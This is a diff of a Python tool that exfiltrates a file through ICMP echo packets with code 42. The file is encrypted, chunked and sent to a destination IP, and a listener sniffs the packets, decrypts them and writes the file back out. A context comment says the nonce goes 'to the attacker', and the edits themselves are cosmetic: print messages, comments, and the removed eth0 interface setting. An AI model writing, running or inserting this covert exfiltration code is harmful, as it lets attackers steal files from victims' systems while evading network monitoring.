@@ -21,7 +21,7 @@ def init_cipher(hex_key, nonce):
 
 def main():
     # Check if the script is run with the correct number of arguments
-    # and the correct mode (send or receive)
+    # and the correct mode
     if len(argv) < 2 or argv[1] not in ["send", "receive"]:
         check_usage()
 
@@ -37,37 +37,35 @@ def main():
         hex_key = argv[2]
         file_path = argv[3]
         dest_ip = argv[4]
-        iface = "eth0"
 
         # Read and encrypt the file
         with open(file_path, "rb") as f:
             data = f.read()
 
-        nonce = os.urandom(8)  # 64-bit nonce
+        nonce = os.urandom(8)
         cipher = init_cipher(hex_key, nonce)
         encrypted = cipher.encrypt(data)
 
-        print(f"[*] File read and encrypted. Sending to {dest_ip}...")
+        print(f"Sending encrypted file to {dest_ip}...")
 
         # Send the nonce to the attacker
         pkt_nonce = IP(dst=dest_ip) / ICMP(type=8, code=42) / Raw(load=nonce)
-        send(pkt_nonce, iface=iface, verbose=False)
+        send(pkt_nonce, verbose=False)
 
-        # Send encrypted data in chunks (max ~1400 bytes per packet)
+        # Send encrypted chunks
         chunk_size = 1400
         for i in range(0, len(encrypted), chunk_size):
             chunk = encrypted[i:i+chunk_size]
             pkt = IP(dst=dest_ip) / ICMP(type=8, code=42) / Raw(load=chunk)
-            send(pkt, iface=iface, verbose=False)
+            send(pkt, verbose=False)
 
-        print(f"[+] Done sending {len(encrypted)} bytes.")
+        print(f"Sent {len(encrypted)} bytes")
 
     elif mode == "receive":
         hex_key = argv[2]
         output_file = argv[3]
-        iface = "eth0"
 
-        print("[*] Listening for ICMP packets...")
+        print("Listening for ICMP packets...")
 
         collected = []
         nonce = None
@@ -78,15 +76,14 @@ def main():
                 payload = bytes(pkt[Raw].load)
                 if nonce is None:
                     nonce = payload
-                    print("[+] Nonce received.")
+                    print("Nonce received")
                 else:
                     collected.append(payload)
 
-        # Sniff until we get all packets (Ctrl+C or timeout stops)
-        sniff(iface=iface, prn=handle_packet, timeout=5)
+        sniff(prn=handle_packet, timeout=5)
 
         if nonce is None:
-            print("[!] No nonce received. Aborting.")
+            print("No nonce received")
             sys.exit(1)
 
         # Combine all encrypted chunks
@@ -100,7 +97,7 @@ def main():
         with open(output_file, "wb") as f:
             f.write(decrypted)
 
-        print(f"[+] File received and saved to {output_file}")
+        print(f"File received and saved to {output_file}")
 
 
 if __name__ == "__main__":
